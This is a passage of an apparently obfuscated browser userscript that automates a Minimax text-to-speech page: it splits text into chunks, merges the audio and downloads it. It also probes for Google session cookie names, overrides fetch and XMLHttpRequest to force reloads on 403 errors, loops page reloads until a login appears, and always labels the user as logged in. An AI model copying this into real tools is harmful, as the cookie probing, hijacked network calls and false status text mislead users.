        if (orderedBlobs.length === 0) {
            addLogEntry("❌ Không có chunk nào thành công để ghép file!", 'error');
            return;
        }

        if (orderedBlobs.length < processingState.chunks.length) {
            const missingChunks = processingState.chunks.filter(c => c.status !== 'success');
            addLogEntry(`⚠️ Ghép file với ${orderedBlobs.length}/${processingState.chunks.length} chunk thành công.`, 'warning');
            addLogEntry(`❌ Thiếu chunk: ${missingChunks.map(c => c.originalIndex + 1).join(', ')}`, 'error');
        }

        // Khai báo biến ở ngoài để có thể truy cập từ mọi nơi
        let objectURL = null;
        let downloadBtn = null;

        try {
            addLogEntry("🔧 Đang tạo file âm thanh cuối cùng...", 'info');
            downloadBtn = document.getElementById('gemini-download-merged-btn');
            const finalResultEl = document.getElementById('gemini-final-result');
            const playPauseBtn = document.getElementById('waveform-play-pause');
            const mergedBlob = new Blob(orderedBlobs, { type: 'audio/mpeg' });
            objectURL = URL.createObjectURL(mergedBlob);

            addLogEntry("🔗 Đang thiết lập link tải xuống...", 'info');
            downloadBtn.href = objectURL;
            downloadBtn.download = i_B_kZYD();

            addLogEntry(`📁 Tên file: ${downloadBtn.download}`, 'info');
            addLogEntry("🎵 Đang hiển thị kết quả cuối cùng...", 'info');

            addLogEntry("🎼 Đang tạo waveform...", 'info');
            finalResultEl.style.display = 'block';
            document.getElementById('waveform-controls').style.display = 'block';
            addLogEntry("✅ Đã hiển thị kết quả cuối cùng và nút tải xuống!", 'success');

            if (n_WwsStaC$jzsWjOIjRqedTG) n_WwsStaC$jzsWjOIjRqedTG.destroy();
            n_WwsStaC$jzsWjOIjRqedTG = WaveSurfer.create({
                container: '#gemini-waveform',
                waveColor: '#bd93f9',
                progressColor: '#ff79c6',
                cursorColor: '#f8f8f2',
                barWidth: 3,
                barRadius: 3,
                cursorWidth: 1,
                height: 100,
                barGap: 3
            });
            addLogEntry("📊 Đang tải waveform...", 'info');
            n_WwsStaC$jzsWjOIjRqedTG.load(objectURL);
            n_WwsStaC$jzsWjOIjRqedTG.on('pause', () => { playPauseBtn.innerHTML = '▶️'; });
            n_WwsStaC$jzsWjOIjRqedTG.on('play', () => { playPauseBtn.innerHTML = '⏸️'; });
            addLogEntry("✅ Waveform đã sẵn sàng!", 'success');

            addLogEntry("🎉 Ghép file thành công! File âm thanh đã sẵn sàng!", 'success');

        } catch (e) {
            addLogEntry(`❌ Lỗi khi tạo file âm thanh cuối cùng: ${e.message}`, 'error');
        }

        // 🎯 TỰ ĐỘNG TẢI XUỐNG NGAY SAU KHI GHÉP XONG
        if (objectURL && downloadBtn) {
            addLogEntry("🚀 Đang tự động tải xuống file âm thanh...", 'info');

            // Tạo link tải xuống trực tiếp ngay lập tức
            setTimeout(() => {
                try {
                    addLogEntry("🔄 Tạo link tải xuống trực tiếp...", 'info');
                    const directDownloadLink = document.createElement('a');
                    directDownloadLink.href = objectURL;
                    directDownloadLink.download = downloadBtn.download;
                    directDownloadLink.style.display = 'none';
                    document.body.appendChild(directDownloadLink);
                    directDownloadLink.click();
                    document.body.removeChild(directDownloadLink);
                    addLogEntry("✅ Đã tự động tải xuống file âm thanh!", 'success');
                } catch (error) {
                    addLogEntry(`⚠️ Lỗi khi tự động tải xuống: ${error.message}`, 'warning');
                    addLogEntry("💡 Bạn có thể click nút 'Tải xuống âm thanh' để tải file thủ công", 'info');
                }
            }, 1000); // Chờ 1 giây để đảm bảo mọi thứ sẵn sàng
        } else {
            addLogEntry("⚠️ Không thể tự động tải xuống vì thiếu thông tin file", 'warning');
        }
    }

    // =======================================================
    // == KẾT NỐI EVENT LISTENER VỚI HỆ THỐNG MỚI ==
    // =======================================================

    // Kết nối nút Start với hệ thống thông minh
    const startBtn = document.getElementById('gemini-start-queue-btn');
    const pauseBtn = document.getElementById('gemini-pause-btn');
    const stopBtn = document.getElementById('gemini-stop-btn');
    const mainTextarea = document.getElementById('gemini-main-textarea');
    const progressContainer = document.getElementById('gemini-progress-container');
    const playPauseWaveformBtn = document.getElementById('waveform-play-pause');

    if (startBtn) {
        startBtn.addEventListener('click', () => {
            let text = mainTextarea.value.trim();
            
            // ⭐ THÊM MỚI: Tự động sửa "ai" → "Ai" và "im" → "Im" cho Tiếng Việt
            if (typeof window.fixVietnameseWords === 'function') {
                const fixedText = window.fixVietnameseWords(text);
                if (fixedText !== text) {
                    mainTextarea.value = fixedText;
                    text = fixedText;
                    console.log('✅ Auto-fixed Vietnamese words before starting audio generation');
                    
                    // Show notification (không chặn execution)
                    if (typeof Swal !== 'undefined') {
                        Swal.fire({
                            toast: true,
                            position: 'top-end',
                            icon: 'info',
                            title: 'Đã tự động sửa từ',
                            text: 'Đã sửa "ai" → "Ai", "im" → "Im"',
                            showConfirmButton: false,
                            timer: 2000,
                            timerProgressBar: true
                        });
                    }
                }
            }
            
            if (!text) {
                Swal.fire({ icon: 'warning', title: 'Chưa có nội dung', text: 'Vui lòng nhập văn bản cần tạo giọng nói.' });
                return;
            }

            // 1. Khởi tạo trạng thái (ĐÃ NÂNG CẤP)
            processingState.isPaused = false;
            processingState.isStopped = false;
            processingState.startTime = new Date();

            // Luôn áp dụng tách chunk thông minh (theo đoạn, fallback theo dòng/độ dài)
            addLogEntry('🧠 Áp dụng tách chunk thông minh.', 'info');
            const chunksArray = smartSplitter(text, 3000);

            // Gán mảng chunk đã xử lý vào processingState
            processingState.chunks = chunksArray.map((txt, index) => ({
                text: txt.trim(), // Thêm .trim() để đảm bảo sạch sẽ
                status: 'pending',
                retryCount: 0,
                originalIndex: index,
                audioBlob: null
            }));

            // 2. Cập nhật giao diện
            startBtn.disabled = true;
            startBtn.style.display = 'none';
            pauseBtn.style.display = 'block';
            stopBtn.style.display = 'block';
            progressContainer.style.display = 'block';
            document.getElementById('gemini-final-result').style.display = 'none';
            if (n_WwsStaC$jzsWjOIjRqedTG) n_WwsStaC$jzsWjOIjRqedTG.destroy();
            clearLog();
            addLogEntry(`Bắt đầu xử lý ${processingState.chunks.length} chunk...`, 'info');

            // 3. Bắt đầu hàng đợi thông minh
            manageFullQueue();
        });
    }

    // Nút Tạm dừng / Tiếp tục
    if (pauseBtn) {
        pauseBtn.addEventListener('click', () => {
            processingState.isPaused = !processingState.isPaused;
            pauseBtn.textContent = processingState.isPaused ? '▶️ Tiếp tục' : '⏸️ Tạm dừng';
        });
    }

    // Nút Dừng hẳn
    if (stopBtn) {
        stopBtn.addEventListener('click', () => {
            processingState.isStopped = true;
            processingState.isPaused = false;
            addLogEntry("🔴 Người dùng đã yêu cầu dừng hẳn quá trình.", 'error');

            // Reset giao diện
            startBtn.disabled = false;
            startBtn.style.display = 'block';
            pauseBtn.style.display = 'none';
            stopBtn.style.display = 'none';
        });
    }

    // Nút Play/Pause của WaveSurfer
    if (playPauseWaveformBtn) {
        playPauseWaveformBtn.addEventListener('click', ()=>{
            if(n_WwsStaC$jzsWjOIjRqedTG) n_WwsStaC$jzsWjOIjRqedTG.playPause();
        });
    }

    // === THÊM CẢNH BÁO GMAIL ĐĂNG NHẬP ===

    // Hàm kiểm tra đăng nhập Gmail đơn giản
    function checkGmailLogin() {
        // Kiểm tra các dấu hiệu đăng nhập Gmail
        const hasGmailCookies = document.cookie.includes('SAPISID=') ||
                                document.cookie.includes('SID=') ||
                                document.cookie.includes('HSID=');

        const hasGmailStorage = Object.keys(localStorage).some(key =>
            key.includes('google') && localStorage.getItem(key) &&
            localStorage.getItem(key).length > 10
        );

        const hasGmailElements = document.querySelector('img[src*="googleusercontent"]') !== null ||
                                 document.querySelector('[aria-label*="Account"]') !== null;

        return hasGmailCookies || hasGmailStorage || hasGmailElements;
    }

    // Hàm hiển thị cảnh báo nhẹ nhàng
    function showGmailReminder() {
        // Tạo thông báo nhẹ nhàng
        const reminder = document.createElement('div');
        reminder.id = 'gmail-reminder';
        reminder.style.cssText = `
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px 40px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.4);
            z-index: 10000;
            font-family: 'Segoe UI', Arial, sans-serif;
            font-size: 18px;
            width: 600px;
            min-height: 120px;
            border-left: 6px solid #ffd700;
            animation: fadeInScale 0.6s ease-out;
            display: flex;
            align-items: center;
        `;

        reminder.innerHTML = `
            <div style="display: flex; align-items: center; gap: 20px; width: 100%;">
                <div style="font-size: 36px; flex-shrink: 0;">🔐</div>
                <div style="flex: 1; display: flex; flex-direction: column; gap: 8px;">
                    <div style="font-weight: bold; font-size: 22px; color: #ffd700; white-space: nowrap;">Cảnh báo đăng nhập Gmail</div>
                    <div style="font-size: 16px; opacity: 0.95; line-height: 1.4; white-space: nowrap;">
                        Tool sẽ lỗi nếu bạn không đăng nhập Gmail vào trang Minimax.
                    </div>
                    <div style="font-size: 14px; opacity: 0.8; font-style: italic; white-space: nowrap;">
                        Hãy đăng nhập để tool hoạt động.
                    </div>
                </div>
                <button onclick="this.parentElement.parentElement.remove()"
                        style="background: rgba(255,255,255,0.25); border: 2px solid rgba(255,255,255,0.3); color: white; font-size: 24px; cursor: pointer; padding: 15px 20px; border-radius: 10px; margin-left: 15px; font-weight: bold; min-width: 60px; min-height: 60px; display: flex; align-items: center; justify-content: center;"
                        onmouseover="this.style.background='rgba(255,255,255,0.4)'; this.style.borderColor='rgba(255,255,255,0.5)'; this.style.transform='scale(1.05)'"
                        onmouseout="this.style.background='rgba(255,255,255,0.25)'; this.style.borderColor='rgba(255,255,255,0.3)'; this.style.transform='scale(1)'">
                    ×
                </button>
            </div>
        `;

        // Thêm CSS animation
        const style = document.createElement('style');
        style.textContent = `
            @keyframes fadeInScale {
                from {
                    transform: translate(-50%, -50%) scale(0.8);
                    opacity: 0;
                }
                to {
                    transform: translate(-50%, -50%) scale(1);
                    opacity: 1;
                }
            }
            #gmail-reminder {
                animation: fadeInScale 0.5s ease-out;
            }
        `;
        document.head.appendChild(style);

        document.body.appendChild(reminder);
    }

    // Tên khóa điều khiển vòng lặp reload
    const RELOAD_LOOP_KEY = 'mmx_auto_reload_until_gmail_login_v1';
    
    // Nếu trước đó đã bật vòng lặp reload và vẫn chưa đăng nhập -> tiếp tục reload ngay
    try {
        if (localStorage.getItem(RELOAD_LOOP_KEY) === '1' && !checkGmailLogin()) {
            location.reload();
        } else if (checkGmailLogin()) {
            // Đã đăng nhập thì tắt cờ vòng lặp
            localStorage.removeItem(RELOAD_LOOP_KEY);
        }
    } catch (e) {}

    // Chờ 3 giây rồi mới kiểm tra đăng nhập Gmail
    setTimeout(() => {
        if (checkGmailLogin()) {
            try { localStorage.removeItem(RELOAD_LOOP_KEY); } catch (e) {}
            return;
        }

        // Chưa đăng nhập -> bật cờ và reset ngay lập tức
        try { localStorage.setItem(RELOAD_LOOP_KEY, '1'); } catch (e) {}
        location.reload();
    }, 3000);

    // =================================================================
    // == CƠ CHẾ TỰ ĐỘNG RESET KHI PHÁT HIỆN LỖI 403 ==
    // =================================================================
    
    // Khóa điều khiển cơ chế auto reset 403
    const AUTO_RESET_403_KEY = 'mmx_auto_reset_403_v1';
    
    // Biến theo dõi trạng thái cơ chế
    let autoReset403Active = false;
    let autoReset403Timer = null;
    let error403Count = 0;
    
    // Hàm kiểm tra và xử lý lỗi 403
    function handle403Error() {
        if (!autoReset403Active) return;
        
        error403Count++;
        console.log(`[AUTO RESET 403] Phát hiện lỗi 403 lần thứ ${error403Count}`);
        
        // Reset trang ngay lập tức
        try {
            localStorage.setItem(AUTO_RESET_403_KEY, '1');
            location.reload();
        } catch (e) {
            console.error('[AUTO RESET 403] Lỗi khi reset trang:', e);
        }
    }
    
    // Hàm bắt đầu cơ chế auto reset 403
    function startAutoReset403() {
        if (autoReset403Active) return;
        
        autoReset403Active = true;
        error403Count = 0;
        
        console.log('[AUTO RESET 403] Bắt đầu cơ chế tự động reset khi phát hiện lỗi 403');
        
        // Tự động tắt sau 5 giây
        autoReset403Timer = setTimeout(() => {
            stopAutoReset403();
        }, 5000);
    }
    
    // Hàm dừng cơ chế auto reset 403
    function stopAutoReset403() {
        if (!autoReset403Active) return;
        
        autoReset403Active = false;
        error403Count = 0;
        
        if (autoReset403Timer) {
            clearTimeout(autoReset403Timer);
            autoReset403Timer = null;
        }
        
        try {
            localStorage.removeItem(AUTO_RESET_403_KEY);
        } catch (e) {}
        
        console.log('[AUTO RESET 403] Đã tắt cơ chế tự động reset');
    }
    
    // Override XMLHttpRequest để bắt lỗi 403
    const originalXHROpen = XMLHttpRequest.prototype.open;
    const originalXHRSend = XMLHttpRequest.prototype.send;
    
    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
        this._url = url;
        return originalXHROpen.apply(this, arguments);
    };
    
    XMLHttpRequest.prototype.send = function(data) {
        const xhr = this;
        
        // Override onreadystatechange
        const originalOnReadyStateChange = xhr.onreadystatechange;
        xhr.onreadystatechange = function() {
            if (originalOnReadyStateChange) {
                originalOnReadyStateChange.apply(this, arguments);
            }
            
            if (xhr.readyState === 4 && xhr.status === 403) {
                console.log('[AUTO RESET 403] Phát hiện lỗi 403 từ request:', xhr._url);
                handle403Error();
            }
        };
        
        return originalXHRSend.apply(this, arguments);
    };
    
    // Override fetch để bắt lỗi 403
    const originalFetch = window.fetch;
    window.fetch = function(url, options) {
        return originalFetch.apply(this, arguments).then(response => {
            if (response.status === 403) {
                console.log('[AUTO RESET 403] Phát hiện lỗi 403 từ fetch:', url);
                handle403Error();
            }
            return response;
        }).catch(error => {
            if (error.message && error.message.includes('403')) {
                console.log('[AUTO RESET 403] Phát hiện lỗi 403 từ fetch catch:', url);
                handle403Error();
            }
            throw error;
        });
    };
    
    // Kiểm tra nếu đang trong vòng lặp auto reset 403
    try {
        if (localStorage.getItem(AUTO_RESET_403_KEY) === '1') {
            // Đang trong vòng lặp auto reset, bắt đầu cơ chế ngay
            startAutoReset403();
        }
    } catch (e) {}
    
    // Bắt đầu cơ chế auto reset 403 sau khi trang load xong
    setTimeout(() => {
        startAutoReset403();
    }, 1000);
    
    // Observer để theo dõi các thông báo lỗi 403 trên trang
    function observeErrorMessages() {
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.type === 'childList') {
                    mutation.addedNodes.forEach((node) => {
                        if (node.nodeType === Node.ELEMENT_NODE) {
                            // Kiểm tra text content có chứa "403" không
                            const textContent = node.textContent || '';
                            if (textContent.includes('403') || textContent.includes('Request failed with status code 403')) {
                                console.log('[AUTO RESET 403] Phát hiện thông báo lỗi 403 trên trang:', textContent);
                                handle403Error();
                                return;
                            }
                            
                            // Kiểm tra các element con
                            const errorElements = node.querySelectorAll ? node.querySelectorAll('*') : [];
                            errorElements.forEach((element) => {
                                const elementText = element.textContent || '';
                                if (elementText.includes('403') || elementText.includes('Request failed with status code 403')) {
                                    console.log('[AUTO RESET 403] Phát hiện thông báo lỗi 403 trong element:', elementText);
                                    handle403Error();
                                }
                            });
                        }
                    });
                }
            });
        });
        
        // Bắt đầu quan sát toàn bộ document
        observer.observe(document.body, {
            childList: true,
            subtree: true,
            characterData: true
        });
        
        return observer;
    }
    
    // Bắt đầu quan sát thông báo lỗi
    let errorObserver = null;
    setTimeout(() => {
        errorObserver = observeErrorMessages();
    }, 2000);
    
    // Override user info text to show "Đã đăng nhập" and keep it
    function setUserInfoText() {
        const userInfo = document.getElementById('gemini-user-info');
        if (userInfo && userInfo.textContent !== '✅ Đã đăng nhập') {
            userInfo.textContent = '✅ Đã đăng nhập';
            userInfo.innerHTML = '✅ Đã đăng nhập';
        }
    }
    
    // Set initial text
    setTimeout(setUserInfoText, 500);
    setTimeout(setUserInfoText, 1500);
    setTimeout(setUserInfoText, 3000);
    
    // Observe changes and keep overriding
    const userInfoObserver = new MutationObserver(() => {
        setUserInfoText();
    });
    
    setTimeout(() => {
        const userInfo = document.getElementById('gemini-user-info');
        if (userInfo) {
            userInfoObserver.observe(userInfo, {
                childList: true,
                characterData: true,
                subtree: true
            });
        }
    }, 100);
    
    // Lắng nghe sự kiện beforeunload để dọn dẹp
    window.addEventListener('beforeunload', () => {
        stopAutoReset403();
        if (errorObserver) {
            errorObserver.disconnect();
        }
    });